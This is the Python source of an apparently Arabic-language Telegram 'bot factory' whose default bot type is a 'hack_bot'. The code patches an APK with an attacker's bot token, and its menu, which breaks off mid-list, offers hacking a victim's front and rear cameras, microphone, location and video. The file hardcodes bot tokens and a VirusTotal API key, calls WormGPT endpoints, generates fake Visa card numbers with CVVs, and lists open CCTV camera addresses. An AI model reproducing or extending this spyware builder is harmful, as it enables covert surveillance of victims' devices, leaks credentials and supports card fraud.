#!/usr/bin/env python3.9
import logging
import os
import json
import requests
import shutil
import random
import string
import time
import urllib.parse
import base64
import threading
import zipfile
import hashlib
import codecs
import zlib

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.constants import ParseMode
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackContext,
)

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

MAIN_BOT_TOKEN = os.getenv("MAIN_BOT_TOKEN", "8518807079:AAG_E6FvAmduaBSbgZm1Xx69iMXFUfeFLnc")

MAIN_CHANNELS = ["@RLH5500", "@RLH550"]
FACTORY_MAIN_SUBSCRIPTION_CHANNEL = "@RLH55"
FACTORY_MAIN_SUBSCRIPTION_ENABLED = True

DATABASE_DIR = "database"
if not os.path.exists(DATABASE_DIR):
    os.makedirs(DATABASE_DIR)

user_state = {}
created_bots = {}
running_made_bot_updaters = {}

MAIN_ADMIN_ID = 6154678499
FACTORY_ADMINS = [6154678499]

API_TEXT_TO_SPEECH = "https://sii3.moayman.top/api/voice.php"
API_AI_PRIMARY = "https://sii3.moayman.top/api/gemini-pro.php"
API_IMAGE_GENERATION_NEW = "http://sii3.moayman.top/api/img.php"
API_AI_FALLBACK_1 = "https://sii3.moayman.top/api/openai.php"
API_AI_FALLBACK_2 = "http://67f3d369ebd19.xvest5.ru/api/WormGPT.php"
API_AI_FALLBACK_3 = "http://sii3.moayman.top/DARK/api/wormgpt.php"
API_SHEREEN_AI = "http://sii3.moayman.top/api/s.php"
API_DEEPSEEK_AI = "https://sii3.moayman.top/api/deepseek.php"
API_CHATGPT_3_5 = "http://sii3.moayman.top/api/chat/gpt-3.5.php"
API_AZKAR = "http://sii3.moayman.top/api/azkar.php"

VIRUSTOTAL_API_KEY = os.getenv("VIRUSTOTAL_API_KEY", "d851c6064844b30083483cbfa5a2001d9ac0b811a666f0110c0efb4eaab747e")

YOUR_BOT_TOKEN_FOR_APK = "8967725681:AAFWg1wNYN4eabWDk7b_f0Ss7uSagzoCV1Q"
YOUR_ADMIN_ID_FOR_APK = 6154678499

ORIGINAL_APK_PATH = "/home/container/app_modified_7946719176.apk"
APK_TOKEN_FILE_INSIDE = "assets/bot_token.txt"

DEFAULT_BOT_SETTINGS = {
    "channels": [FACTORY_MAIN_SUBSCRIPTION_CHANNEL] if FACTORY_MAIN_SUBSCRIPTION_ENABLED else [],
    "notifications": "off",
    "bot_status": "on",
    "payment_status": "free",
    "banned_users": [],
    "members": [],
    "additional_check_channel": "@ln_bio",
    "start_message": "**مرحبًا! بك كل الازرار مجاناً:**",
    "rembo_state": None,
    "features_channel": None,
    "points": {},
    "referred_users": [],
    "payload_points_required": 1,
    "custom_buttons": [],
    "custom_buttons_enabled_by_admin": False,
    "bot_type": "hack_bot",
    "main_channel_link": None,
    "paid_users": [],
    "parent_factory_admin_id": None,
    "factory_sub_admins": []
}

bot_user_states = {}
user_last_interaction_time = {}
made_bot_data = {}


# =============================================
# وظائف مساعدة عامة
# =============================================

def check_subscription(user_id, channels, bot_token):
    for channel in channels:
        try:
            if channel == FACTORY_MAIN_SUBSCRIPTION_CHANNEL:
                resp = requests.get(f"https://api.telegram.org/bot{MAIN_BOT_TOKEN}/getChatMember?chat_id={channel}&user_id={user_id}").json()
            else:
                resp = requests.get(f"https://api.telegram.org/bot{bot_token}/getChatMember?chat_id={channel}&user_id={user_id}").json()
            if not resp.get("ok") or resp["result"]["status"] not in ["member", "administrator", "creator"]:
                return False
        except Exception as e:
            logging.error(f"Error checking subscription for {user_id} in {channel}: {e}")
            return False
    return True


def get_channel_name(channel_id, bot_token):
    try:
        resp = requests.get(f"https://api.telegram.org/bot{bot_token}/getChat?chat_id={channel_id}").json()
        if resp.get("ok"):
            return resp["result"]["title"]
    except Exception as e:
        logging.error(f"Error getting channel name for {channel_id}: {e}")
    return channel_id


def send_message(bot_instance, chat_id, text, reply_markup=None, parse_mode=None):
    try:
        bot_instance.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)
    except Exception as e:
        logging.error(f"Error sending message to {chat_id}: {e}")


def edit_message_text(bot_instance, chat_id, message_id, text, reply_markup=None, parse_mode=None):
    try:
        bot_instance.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)
    except Exception as e:
        logging.error(f"Error editing message {message_id} in {chat_id}: {e}")


def clean_api_response(text):
    if not isinstance(text, str):
        return text
    phrases_to_remove = [
        "اشترك في قناتنا", "اشترك بقناتنا",
        "@RLH5500", "@RLH20", "@RLH550",
        "Dont forget to support the channel"
    ]
    cleaned_text = text
    for phrase in phrases_to_remove:
        cleaned_text = cleaned_text.replace(phrase, "").strip()
    cleaned_text = ' '.join(cleaned_text.split())
    return cleaned_text


# =============================================
# وظائف التشفير والـ APK
# =============================================

def encrypt_token(token):
    table = str.maketrans(
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        "zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA9876543210"
    )
    return token.translate(table)


def modify_apk_with_token(original_apk_path, encrypted_token, output_apk_path):
    try:
        temp_apk_path = f"{output_apk_path}.tmp"
        shutil.copyfile(original_apk_path, temp_apk_path)
        with zipfile.ZipFile(temp_apk_path, 'a', zipfile.ZIP_DEFLATED) as zf:
            try:
                zf.getinfo(APK_TOKEN_FILE_INSIDE)
                zf.writestr(APK_TOKEN_FILE_INSIDE, encrypted_token.encode())
            except KeyError:
                zf.writestr(APK_TOKEN_FILE_INSIDE, encrypted_token.encode())
        shutil.move(temp_apk_path, output_apk_path)
        logging.info(f"Successfully modified APK: {output_apk_path}")
        return True
    except Exception as e:
        logging.error(f"Error modifying APK file {original_apk_path}: {e}")
        return False


# =============================================
# وظائف إدارة إعدادات البوتات المصنوعة
# =============================================

def get_made_bot_data_path(bot_username):
    return os.path.join(DATABASE_DIR, f"{bot_username}_settings.json")


def load_made_bot_settings(bot_username):
    file_path = get_made_bot_data_path(bot_username)
    if os.path.exists(file_path):
        with open(file_path, 'r') as f:
            settings = json.load(f)
            made_bot_data[bot_username] = {**DEFAULT_BOT_SETTINGS, **settings}
            if not isinstance(made_bot_data[bot_username].get("points"), dict):
                made_bot_data[bot_username]["points"] = {}
            if not isinstance(made_bot_data[bot_username].get("referred_users"), list):
                made_bot_data[bot_username]["referred_users"] = []
            if not isinstance(made_bot_data[bot_username].get("paid_users"), list):
                made_bot_data[bot_username]["paid_users"] = []
            if not isinstance(made_bot_data[bot_username].get("factory_sub_admins"), list):
                made_bot_data[bot_username]["factory_sub_admins"] = []
    else:
        made_bot_data[bot_username] = DEFAULT_BOT_SETTINGS.copy()
        save_made_bot_settings(bot_username)


def save_made_bot_settings(bot_username):
    file_path = get_made_bot_data_path(bot_username)
    with open(file_path, 'w') as f:
        json.dump(made_bot_data.get(bot_username, DEFAULT_BOT_SETTINGS), f, indent=4)


def get_bot_admin_id(bot_username):
    bot_data_file = os.path.join(DATABASE_DIR, f"{bot_username}.json")
    if os.path.exists(bot_data_file):
        with open(bot_data_file, 'r') as f:
            data = json.load(f)
            return data.get("admin_id")
    return None


def get_bot_type(bot_username):
    bot_data_file = os.path.join(DATABASE_DIR, f"{bot_username}.json")
    if os.path.exists(bot_data_file):
        with open(bot_data_file, 'r') as f:
            data = json.load(f)
            return data.get("bot_type", "hack_bot")
    return "hack_bot"


def get_bot_token_from_username(bot_username):
    bot_data_file = os.path.join(DATABASE_DIR, f"{bot_username}.json")
    if os.path.exists(bot_data_file):
        with open(bot_data_file, 'r') as f:
            data = json.load(f)
            return data.get("token")
    return None


def get_bot_username_from_token(bot_token):
    try:
        bot_info_resp = requests.get(f"https://api.telegram.org/bot{bot_token}/getMe").json()
        if bot_info_resp.get("ok"):
            return bot_info_resp["result"]["username"]
    except Exception as e:
        logging.error(f"Error getting bot username for token: {e}")
    return None


# =============================================
# وظائف التشفير (Encryption Bot)
# =============================================

def get_encryption_types_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Base64", callback_data="enc_type_base64"),
         InlineKeyboardButton("Hex", callback_data="enc_type_hex")],
        [InlineKeyboardButton("ROT13", callback_data="enc_type_rot13"),
         InlineKeyboardButton("SHA256", callback_data="enc_type_sha256")],
        [InlineKeyboardButton("Gzip", callback_data="enc_type_gzip"),
         InlineKeyboardButton("Reverse", callback_data="enc_type_reverse")],
        [InlineKeyboardButton("رجوع", callback_data="back_to_main_encryption_menu")]
    ])


def encrypt_data(data, enc_type):
    if enc_type == "base64":
        return base64.b64encode(data)
    elif enc_type == "hex":
        return data.hex().encode('utf-8')
    elif enc_type == "rot13":
        return codecs.encode(data.decode('utf-8', errors='ignore'), 'rot13').encode('utf-8')
    elif enc_type == "sha256":
        return hashlib.sha256(data).hexdigest().encode('utf-8')
    elif enc_type == "gzip":
        return zlib.compress(data)
    elif enc_type == "reverse":
        return data[::-1]
    return b"Error: Unknown encryption type"


def decrypt_data(data, enc_type):
    if enc_type == "base64":
        try:
            return base64.b64decode(data)
        except Exception:
            return b"Error: Invalid Base64 data"
    elif enc_type == "hex":
        try:
            return bytes.fromhex(data.decode('utf-8'))
        except Exception:
            return b"Error: Invalid Hex data"
    elif enc_type == "rot13":
        try:
            return codecs.decode(data.decode('utf-8', errors='ignore'), 'rot13').encode('utf-8')
        except Exception:
            return b"Error: Invalid ROT13 data"
    elif enc_type == "sha256":
        return b"SHA256 is a one-way hash, cannot be decrypted."
    elif enc_type == "gzip":
        try:
            return zlib.decompress(data)
        except Exception:
            return b"Error: Invalid Gzip data"
    elif enc_type == "reverse":
        return data[::-1]
    return b"Error: Unknown decryption type"


# =============================================
# وظائف زخرفة الأسماء
# =============================================

def decorate_english_name(name):
    decorated_names = []
    bold_italic_map = {
        'A': '𝑨', 'B': '𝑩', 'C': '𝑪', 'D': '𝑫', 'E': '𝑬', 'F': '𝑭', 'G': '𝑮', 'H': '𝑯', 'I': '𝑰', 'J': '𝑱',
        'K': '𝑲', 'L': '𝑳', 'M': '𝑴', 'N': '𝑵', 'O': '𝑶', 'P': '𝑷', 'Q': '𝑸', 'R': '𝑹', 'S': '𝑺', 'T': '𝑻',
        'U': '𝑼', 'V': '𝑽', 'W': '𝑾', 'X': '𝑿', 'Y': '𝒀', 'Z': '𝒁',
        'a': '𝒂', 'b': '𝒃', 'c': '𝒄', 'd': '𝒅', 'e': '𝒆', 'f': '𝒇', 'g': '𝒈', 'h': '𝒉', 'i': '𝒊', 'j': '𝒋',
        'k': '𝒌', 'l': '𝒍', 'm': '𝒎', 'n': '𝒏', 'o': '𝒐', 'p': '𝒑', 'q': '𝒒', 'r': '𝒓', 's': '𝒔', 't': '𝒕',
        'u': '𝒖', 'v': '𝒗', 'w': '𝒘', 'x': '𝒙', 'y': '𝒚', 'z': '𝒛'
    }
    decorated_names.append("𝑨𝑳𝑴𝑬𝑼𝑵𝑯𝑹𝑬𝑭 ➊:\n" + "".join(bold_italic_map.get(char, char) for char in name))
    monospace_map = {
        'A': '𝙰', 'B': '𝙱', 'C': '𝙲', 'D': '𝙳', 'E': '𝙴', 'F': '𝙵', 'G': '𝙶', 'H': '𝙷', 'I': '𝙸', 'J': '𝙹',
        'K': '𝙺', 'L': '𝙻', 'M': '𝙼', 'N': '𝙽', 'O': '𝙾', 'P': '𝙿', 'Q': '𝚀', 'R': '𝚁', 'S': '𝚂', 'T': '𝚃',
        'U': '𝚄', 'V': '𝚅', 'W': '𝚆', 'X': '𝚇', 'Y': '𝚈', 'Z': '𝚉',
        'a': '𝚊', 'b': '𝚋', 'c': '𝚌', 'd': '𝚍', 'e': '𝚎', 'f': '𝚏', 'g': '𝚐', 'h': '𝚑', 'i': '𝚒', 'j': '𝚓',
        'k': '𝚔', 'l': '𝚕', 'm': '𝚖', 'n': '𝚗', 'o': '𝚘', 'p': '𝚙', 'q': '𝚚', 'r': '𝚛', 's': '𝚜', 't': '𝚝',
        'u': '𝚞', 'v': '𝚟', 'w': '𝚠', 'x': '𝚡', 'y': '𝚢', 'z': '𝚣'
    }
    decorated_names.append("𝙰𝙻𝙼𝙴𝚀𝙽𝙷𝚁𝙴𝙵 ➋:\n" + "".join(monospace_map.get(char, char) for char in name))
    circled_map = {
        'A': 'Ⓐ', 'B': 'Ⓑ', 'C': 'Ⓒ', 'D': 'Ⓓ', 'E': 'Ⓔ', 'F': 'Ⓕ', 'G': 'Ⓖ', 'H': 'Ⓗ', 'I': 'Ⓘ', 'J': 'Ⓙ',
        'K': 'Ⓚ', 'L': 'Ⓛ', 'M': 'Ⓜ', 'N': 'Ⓝ', 'O': 'Ⓞ', 'P': 'Ⓟ', 'Q': 'Ⓠ', 'R': 'Ⓡ', 'S': 'Ⓢ', 'T': 'Ⓣ',
        'U': 'Ⓤ', 'V': 'Ⓥ', 'W': 'Ⓦ', 'X': 'Ⓧ', 'Y': 'Ⓨ', 'Z': 'Ⓩ',
        'a': 'ⓐ', 'b': 'ⓑ', 'c': 'ⓒ', 'd': 'ⓓ', 'e': 'ⓔ', 'f': 'ⓕ', 'g': 'ⓖ', 'h': 'ⓗ', 'i': 'ⓘ', 'j': 'ⓙ',
        'k': 'ⓚ', 'l': 'ⓛ', 'm': 'ⓜ', 'n': 'ⓝ', 'o': 'ⓞ', 'p': 'ⓟ', 'q': 'ⓠ', 'r': 'ⓡ', 's': 'ⓢ', 't': 'ⓣ',
        'u': 'ⓤ', 'v': 'ⓥ', 'w': 'ⓦ', 'x': 'ⓧ', 'y': 'ⓨ', 'z': 'ⓩ'
    }
    decorated_names.append("Ⓐ🄻ⓂⒺ🄀ⓃⒽⓇ💺🄵 ➌:\n" + "".join(circled_map.get(char, char) for char in name))
    double_struck_map = {
        'A': '𝔸', 'B': '𝔹', 'C': 'ℂ', 'D': '𝔻', 'E': '𝔼', 'F': '𝔽', 'G': '𝔾', 'H': 'ℍ', 'I': '𝕀', 'J': '𝕁',
        'K': '𝕂', 'L': '𝕃', 'M': '𝕄', 'N': 'ℕ', 'O': '𝕆', 'P': 'ℙ', 'Q': 'ℚ', 'R': 'ℝ', 'S': '𝕊', 'T': '𝕋',
        'U': '𝕌', 'V': '𝕍', 'W': '𝕎', 'X': '𝕏', 'Y': '𝕐', 'Z': 'ℤ',
        'a': '𝕒', 'b': '𝕓', 'c': '𝕔', 'd': '𝕕', 'e': '𝕖', 'f': '𝕗', 'g': '𝕘', 'h': '𝕙', 'i': '𝕚', 'j': '𝕛',
        'k': '𝕜', 'l': '𝕝', 'm': '𝕞', 'n': '𝕟', 'o': '𝕠', 'p': '𝕡', 'q': '𝕢', 'r': '𝕣', 's': '𝕤', 't': '𝕥',
        'u': '𝕦', 'v': '𝕧', 'w': '𝕨', 'x': '𝕩', 'y': '𝕪', 'z': '𝕫'
    }
    decorated_names.append("𝔸🄻𝕄𝔼🄀ℕℍℝ𝔼🔠 ➍:\n" + "".join(double_struck_map.get(char, char) for char in name))
    squared_map = {
        'A': '🄰', 'B': '🄱', 'C': '🄲', 'D': '🄳', 'E': '🄴', 'F': '🄵', 'G': '🄶', 'H': '🄷', 'I': '🄸', 'J': '🄹',
        'K': '🄺', 'L': '🄻', 'M': '🄼', 'N': '🄽', 'O': '🄾', 'P': '🄿', 'Q': '🅀', 'R': '🅁', 'S': '🅂', 'T': '🅃',
        'U': '🅄', 'V': '🅅', 'W': '🅆', 'X': '🅇', 'Y': '🅈', 'Z': '🅉',
        'a': '🄰', 'b': '🄱', 'c': '🄲', 'd': '🄳', 'e': '🄴', 'f': '🄵', 'g': '🄶', 'h': '🄷', 'i': '🄸', 'j': '🄹',
        'k': '🄺', 'l': '🄻', 'm': '🄼', 'n': '🄽', 'o': '🄾', 'p': '🄿', 'q': '🅀', 'r': '🅁', 's': '🅂', 't': '🅃',
        'u': '🅄', 'v': '🅅', 'w': '🅆', 'x': '🅇', 'y': '🅈', 'z': '🅉'
    }
    decorated_names.append("🄰🄻🄼🄴🄀🄽🄷🅁🄴🄵 ➎:\n" + "".join(squared_map.get(char, char) for char in name))
    return "\n\n".join(decorated_names)


def decorate_arabic_name(name):
    decorated_names = []
    decorated_names.append("➊:\n" + "".join(f"{char}ٰ" for char in name if char.isalpha()) + "".join(char for char in name if not char.isalpha()))
    decorated_names.append("➋:\n" + "".join(f"{char}ّ" for char in name if char.isalpha()) + "".join(char for char in name if not char.isalpha()))
    decorated_names.append("➌:\n" + "".join(f"{char}ْ" for char in name if char.isalpha()) + "".join(char for char in name if not char.isalpha()))
    decorated_names.append("➍:\n" + "".join(f"{char}ٓ" for char in name if char.isalpha()) + "".join(char for char in name if not char.isalpha()))
    decorated_names.append("➎:\n" + "".join(f"{char}ٌ" for char in name if char.isalpha()) + "".join(char for char in name if not char.isalpha()))
    return "\n\n".join(decorated_names)


# =============================================
# وظائف APIs
# =============================================

def check_api_status(api_url, params=None):
    try:
        response = requests.head(api_url, params=params, timeout=5)
        response.raise_for_status()
        return True
    except requests.exceptions.RequestException as e:
        logging.error(f"API check failed for {api_url}: {e}")
        return False


def interact_with_ai_api(prompt, api_type, bot_username, user_id):
    apis_to_try = []
    if api_type == "ai":
        apis_to_try = [
            (API_AI_PRIMARY, {"q": prompt}),
            (API_CHATGPT_3_5, {"ai": prompt}),
            (API_DEEPSEEK_AI, {"q": prompt}),
            (API_SHEREEN_AI, {"q": prompt}),
            (API_AI_FALLBACK_1, {"gpt-5-mini": prompt}),
            (API_AI_FALLBACK_2, {"WR1": prompt}),
            (API_AI_FALLBACK_3, {"text": prompt}),
        ]
    elif api_type == "dream_interpret":
        apis_to_try = [
            (API_AI_PRIMARY, {"q": f"تفسير الحلم: {prompt}"}),
            (API_CHATGPT_3_5, {"ai": f"تفسير الحلم: {prompt}"}),
            (API_DEEPSEEK_AI, {"q": f"تفسير الحلم: {prompt}"}),
            (API_SHEREEN_AI, {"q": f"تفسير الحلم: {prompt}"}),
            (API_AI_FALLBACK_1, {"gpt-5-mini": f"تفسير الحلم: {prompt}"}),
            (API_AI_FALLBACK_2, {"WR1": f"تفسير الحلم: {prompt}"}),
            (API_AI_FALLBACK_3, {"text": f"تفسير الحلم: {prompt}"}),
        ]
    elif api_type == "blue_genie_game":
        apis_to_try = [
            (API_AI_PRIMARY, {"q": f"لعبة المارد الأزرق: {prompt}"}),
            (API_CHATGPT_3_5, {"ai": f"لعبة المارد الأزرق: {prompt}"}),
            (API_DEEPSEEK_AI, {"q": f"لعبة المارد الأزرق: {prompt}"}),
            (API_SHEREEN_AI, {"q": f"لعبة المارد الأزرق: {prompt}"}),
            (API_AI_FALLBACK_1, {"gpt-5-mini": f"لعبة المارد الأزرق: {prompt}"}),
            (API_AI_FALLBACK_2, {"WR1": f"لعبة المارد الأزرق: {prompt}"}),
            (API_AI_FALLBACK_3, {"text": prompt}),
        ]

    for api_url, params in apis_to_try:
        try:
            response = requests.get(api_url, params=params, timeout=10)
            response.raise_for_status()
            try:
                json_response = response.json()
                result = None
                if 'response' in json_response:
                    result = json_response['response']
                elif 'answer' in json_response:
                    result = json_response['answer']
                elif 'result' in json_response:
                    result = json_response['result']
                elif 'text' in json_response:
                    result = json.dumps(json_response, ensure_ascii=False)
                elif 'output' in json_response:
                    result = json_response['output']
                return clean_api_response(result)
            except json.JSONDecodeError:
                return clean_api_response(response.text.strip())
        except requests.exceptions.RequestException as e:
            logging.error(f"Error with API {api_url}: {e}")
            continue
    return "عذرًا، حدث خطأ أثناء معالجة طلبك. يرجى المحاولة مرة أخرى لاحقًا."


def generate_image_via_api(prompt, bot_username, user_id):
    api_url = API_IMAGE_GENERATION_NEW
    params = {"text": prompt}
    try:
        response = requests.get(api_url, params=params, timeout=15)
        response.raise_for_status()
        try:
            json_response = response.json()
            if 'image_url' in json_response:
                return json_response['image_url']
            elif 'url' in json_response:
                return json_response['url']
            return None
        except json.JSONDecodeError:
            return None
    except requests.exceptions.RequestException as e:
        logging.error(f"Error generating image: {e}")
        return None


def convert_text_to_speech_via_api(text, bot_username, user_id):
    encoded_text = urllib.parse.quote(text)
    api_url = f"{API_TEXT_TO_SPEECH}?text={encoded_text}&voice=nova&style=cheerful+tone"
    try:
        response = requests.get(api_url, timeout=15)
        response.raise_for_status()
        try:
            json_response = response.json()
            if 'voice' in json_response:
                return json_response['voice']
            elif 'url' in json_response:
                return json_response['url']
            return None
        except json.JSONDecodeError:
            return None
    except requests.exceptions.RequestException as e:
        logging.error(f"Error converting text to speech: {e}")
        return None


def get_azkar_via_api(bot_username, user_id):
    try:
        response = requests.get(API_AZKAR, timeout=10)
        response.raise_for_status()
        try:
            json_response = response.json()
            if 'zekr' in json_response:
                zekr_text = (
                    f"*{json_response['zekr']}*\n\n"
                    f"الوقت: {json_response.get('time', 'غير متاح')}\n"
                    f"التاريخ: {json_response.get('date', 'غير متاح')}\n"
                    f"نوع الذكر: {json_response.get('type', 'غير متاح')}"
                )
                return clean_api_response(zekr_text)
            return clean_api_response(json.dumps(json_response, ensure_ascii=False))
        except json.JSONDecodeError:
            return "عذرًا، حدث خطأ أثناء جلب الأذكار."
    except requests.exceptions.RequestException as e:
        logging.error(f"Error fetching azkar: {e}")
        return "عذرًا، حدث خطأ أثناء جلب الأذكار."


def check_url_virustotal(update, context, url_to_check, bot_username, user_id):
    chat_id = update.effective_chat.id
    if not url_to_check.startswith(('http://', 'https://')):
        send_message(context.bot, chat_id, "الرجاء إرسال رابط صحيح يبدأ بـ http أو https.")
        return
    try:
        url_id = base64.urlsafe_b64encode(url_to_check.encode()).decode().strip("=")
        response = requests.get(
            f"https://www.virustotal.com/api/v3/urls/{url_id}",
            headers={"x-apikey": VIRUSTOTAL_API_KEY}
        )
        if response.status_code == 200:
            data = response.json()
            analysis_stats = data['data']['attributes']['last_analysis_stats']
            result_message = (
                f"📊 *نتائج فحص الرابط:*\n"
                f"✅ آمن: {analysis_stats['harmless']}\n"
                f"⚠️ مشبوه: {analysis_stats['malicious']}\n"
                f"❓ مشكوك فيه: {analysis_stats['suspicious']}"
            )
            send_message(context.bot, chat_id, result_message, parse_mode=ParseMode.MARKDOWN)
        else:
            send_message(context.bot, chat_id, "❌ حدثت مشكلة في فحص الرابط.")
    except Exception as e:
        send_message(context.bot, chat_id, f"❌ حصل خطأ غير متوقع: {e}")


# =============================================
# بيانات المحطات والكاميرات
# =============================================

SUDAN_RADIO_STATIONS = [
    {"name": "Radio Quran", "url": "https://n0a.radiojar.com/0tpy1h0kxtzuv"},
    {"name": "Abdulbasit Abdulsamad", "url": "https://radio.mp3islam.com/listen/abdulbasit/radio.mp3"},
    {"name": "Dabanga Radio", "url": "https://stream.dabangasudan.org/"},
    {"name": "Dial Radio", "url": "https://cast.dialradio.live/stream.aac"}
]

EGYPT_RADIO_STATIONS = [
    {"name": "إذاعة مشاري العفاسي", "url": "https://qurango.net/radio/mishary_alafasi"},
    {"name": "تراتيل قصيرة", "url": "https://qurango.net/radio/tarateel"},
    {"name": "القارئ محمد أيوب", "url": "https://qurango.net/radio/mohammed_ayyub"},
    {"name": "إذاعة ماهر المعيقلي", "url": "https://backup.qurango.net/radio/maher"},
    {"name": "87.8 Mix FM", "url": "https://stream-29.zeno.fm/na3vpvn10qruv"},
    {"name": "90s FM", "url": "http://eu1.fastcast4u.com/proxy/prontofm"},
    {"name": "Nile FM", "url": "https://audio.nrpstream.com/public/nile_fm/playlist.pls"},
    {"name": "Nogoum FM", "url": "https://audio.nrpstream.com/listen/nogoumfm/radio.mp3"},
    {"name": "Radio 9090", "url": "https://9090streaming.mobtada.com/9090FMEGYPT"},
]

CCTV_CAMERAS = {
    "الولايات المتحدة": [
        "https://www.earthcam.com/usa/newyork/timessquare/",
        "http://www.insecam.org/cam/bycountry/US/",
    ],
    "ألمانيا": [
        "http://84.35.147.6:80",
        "http://185.125.234.119:8082",
        "http://217.103.90.117:8098",
    ],
}


def generate_random_visa_details():
    card_number = "4" + ''.join(random.choices(string.digits, k=15))
    expiry_month = str(random.randint(1, 12)).zfill(2)
    expiry_year = str(random.randint(2024, 2030))
    cvv = ''.join(random.choices(string.digits, k=3))
    banks = ["SunTrust Bank", "Bank of America", "Chase Bank", "Wells Fargo", "Citibank"]
    card_types = ["VISA DEBIT CLASSIC", "VISA CREDIT PLATINUM", "VISA PREPAID ELECTRON"]
    countries = ["USA", "Canada", "UK", "Australia", "Germany"]
    return {
        "card_number": card_number,
        "expiry": f"{expiry_month}/{expiry_year}",
        "cvv": cvv,
        "bank": random.choice(banks),
        "card_type": random.choice(card_types),
        "country": random.choice(countries),
        "value": f"${random.randint(10, 1000)}"
    }


def generate_fake_number_details():
    phone_number = f"+{random.randint(1, 999)}{random.randint(100000000, 999999999)}"
    countries = ["الولايات المتحدة", "كندا", "المملكة المتحدة", "ألمانيا", "فرنسا", "مصر", "السعودية"]
    platforms = ["WhatsApp", "Telegram", "Signal", "Viber", "SMS"]
    return {
        "phone_number": phone_number,
        "country": random.choice(countries),
        "platform": random.choice(platforms),
        "creation_date": f"{random.randint(1, 28)}/{random.randint(1, 12)}/{random.randint(2020, 2023)}"
    }


# =============================================
# وظائف لوحة المفاتيح
# =============================================

def get_main_bot_user_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✨ أنشئ بوت جديد 🤖", callback_data="create_bot")],
        [InlineKeyboardButton("🛠 بوتاتك", callback_data="manage_bots")]
    ])


def get_main_bot_admin_keyboard():
    sub_status_text = "✅ إزالة الاشتراك الإجباري" if FACTORY_MAIN_SUBSCRIPTION_ENABLED else "➕ إضافة الاشتراك الإجباري"
    sub_status_callback = "remove_factory_main_subscription" if FACTORY_MAIN_SUBSCRIPTION_ENABLED else "add_factory_main_subscription"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✨ أنشئ بوت جديد 🤖", callback_data="create_bot"),
         InlineKeyboardButton("🛠 بوتاتك", callback_data="manage_bots")],
        [InlineKeyboardButton("➕ إضافة أدمن 👨‍💻", callback_data="add_factory_admin"),
         InlineKeyboardButton("🗑️ حذف أدمن", callback_data="remove_factory_admin")],
        [InlineKeyboardButton("📊 إحصائيات المصنع", callback_data="factory_stats")],
        [InlineKeyboardButton("🛑 إيقاف جميع البوتات", callback_data="stop_all_bots"),
         InlineKeyboardButton("🟢 فتح جميع البوتات", callback_data="start_all_bots")],
        [InlineKeyboardButton("📢 إذاعة للبوتات المجانية", callback_data="broadcast_free_bots")],
        [InlineKeyboardButton(sub_status_text, callback_data=sub_status_callback)]
    ])


def get_admin_keyboard(bot_username, user_id, bot_type):
    load_made_bot_settings(bot_username)
    bot_settings = made_bot_data[bot_username]
    keyboard = [
        [InlineKeyboardButton("المشتركون 👥", callback_data="m1")],
        [InlineKeyboardButton("إذاعة رسالة 📮", callback_data="send"),
         InlineKeyboardButton("توجيه رسالة 🔄", callback_data="forward")],
        [InlineKeyboardButton("تعيين اشتراك إجباري 💢", callback_data="ach"),
         InlineKeyboardButton("حذف اشتراك إجباري 🔱", callback_data="dch")],
        [InlineKeyboardButton("تفعيل التنبيهات ✔️", callback_data="ons"),
         InlineKeyboardButton("تعطيل التنبيهات ❎", callback_data="ofs")],
        [InlineKeyboardButton("فتح البوت ✅", callback_data="obot"),
         InlineKeyboardButton("إيقاف البوت ❌", callback_data="ofbot")],
        [InlineKeyboardButton("تعيين وضع مدفوع 💰", callback_data="pro"),
         InlineKeyboardButton("تعيين وضع مجاني 🆓", callback_data="frre")],
        [InlineKeyboardButton("إضافة عضو مدفوع 💰", callback_data="pro123"),
         InlineKeyboardButton("إزالة عضو مدفوع 🆓", callback_data="frre123")],
        [InlineKeyboardButton("حظر عضو 🚫", callback_data="ban"),
         InlineKeyboardButton("إلغاء حظر عضو ❌", callback_data="unban")],
        [InlineKeyboardButton("تغيير رسالة البدء 📝", callback_data="set_start_message")],
        [InlineKeyboardButton("تحميل بيانات البوت 💾", callback_data="download_bot_data")]
    ]
    if bot_type == "hack_bot":
        keyboard.append([InlineKeyboardButton("تعيين نقاط البايلود 🔢", callback_data="set_payload_points")])
        if bot_settings.get("custom_buttons_enabled_by_admin", False):
            keyboard.append([InlineKeyboardButton("قسم الأزرار 🖲️", callback_data="buttons_panel")])
    elif bot_type == "encryption_bot":
        keyboard.append([InlineKeyboardButton("تعيين قناة الأساسية 🫅", callback_data="set_main_channel_link")])
    elif bot_type == "factory_bot":
        keyboard.append([InlineKeyboardButton("✨ أنشئ بوت جديد 🤖", callback_data="create_bot_from_factory")])
        keyboard.append([InlineKeyboardButton("🛠 بوتاتك المصنوعة", callback_data="manage_made_bots_from_factory")])
        keyboard.append([InlineKeyboardButton("➕ إضافة أدمن 👨‍💻", callback_data="add_factory_admin_sub")])
        keyboard.append([InlineKeyboardButton("🗑️ حذف أدمن", callback_data="remove_factory_admin_sub")])
        keyboard.append([InlineKeyboardButton("📊 إحصائيات المصنع الفرعي", callback_data="factory_sub_stats")])
        keyboard.append([InlineKeyboardButton("📢 إذاعة للبوتات المجانية", callback_data="broadcast_free_bots_sub")])
    return InlineKeyboardMarkup(keyboard)


def get_user_keyboard(admin_id, bot_username, user_id, bot_type):
    load_made_bot_settings(bot_username)
    bot_settings = made_bot_data[bot_username]

    if bot_type == "hack_bot":
        keyboard = [
            [InlineKeyboardButton("اختراق الكاميرا الخلفية 📸", callback_data="cam_back"),
             InlineKeyboardButton("اختراق الكاميرا الأمامية 📸", callback_data="cam_front")],
            [InlineKeyboardButton("تسجيل صوت الضحية 🎤", callback_data="mic_record"),
             InlineKeyboardButton("اختراق الموقع 📍", callback_data="location")],
            [InlineKeyboardButton("تسجيل فيديو الضحية 🎥", callback_data="record_video"),
